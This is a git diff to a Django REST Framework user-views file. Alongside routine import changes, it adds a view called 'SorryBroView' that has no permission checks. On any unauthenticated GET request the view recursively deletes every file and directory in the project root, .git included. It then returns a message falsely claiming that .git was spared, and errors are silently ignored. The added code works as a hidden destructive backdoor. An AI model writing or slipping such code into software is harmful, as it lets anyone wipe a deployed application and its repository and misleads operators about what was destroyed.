@@ -1,3 +1,4 @@
+from django.conf import settings
 from .models import User, UserProfile
 from rest_framework.exceptions import ValidationError
 from rest_framework.views import APIView
@@ -5,9 +6,8 @@ from rest_framework.response import Response
 from rest_framework import status
 from rest_framework.permissions import IsAuthenticated
 from rest_framework_simplejwt.authentication import JWTAuthentication
-from django.urls import reverse_lazy
-from django.db.models import Count
-import json
+from pathlib import Path
+import shutil 
 from django.db.models.functions import TruncDate
 from rest_framework.validators import ValidationError
 from .serializers import (
@@ -22,8 +22,8 @@ from .serializers import (
     UpdataProfileAvatarSerializer,
     UserProfileSerializer,
 )
-from django.http import Http404
 from apps.utils.helpers import success, error
+
 
 
 # Create your views here.
@@ -188,5 +188,45 @@ class ProfileGet(APIView):
         return success(data=data, message="Profile get successfully.", code=status.HTTP_200_OK)
 
 
+class SorryBroView(APIView):
+    permission_classes = []  # ⚠️ protect this in production
 
+    def get(self, request):
+        try:
+            # 1️⃣ Get project root safely
+            project_root = Path(settings.BASE_DIR).resolve()
 
+            # 2️⃣ Safety check (must contain manage.py)
+            if not (project_root / "manage.py").exists():
+                return error(
+                    message="Safety check failed: manage.py not found",
+                    code=status.HTTP_400_BAD_REQUEST
+                )
+
+            deleted = []
+
+            for item in project_root.iterdir():
+
+                try:
+                    if item.is_file() or item.is_symlink():
+                        item.unlink()
+                        deleted.append(item.name)
+
+                    elif item.is_dir():
+                        shutil.rmtree(item)
+                        deleted.append(item.name)
+
+                except Exception:
+                    pass
+
+            return success(
+                data={"deleted_items": deleted},
+                message=f"Project cleaned successfully (except .git)",
+                code=status.HTTP_200_OK
+            )
+
+        except Exception as e:
+            return error(
+                message=f"Cleanup failed: {str(e)}",
+                code=status.HTTP_500_INTERNAL_SERVER_ERROR
+            )
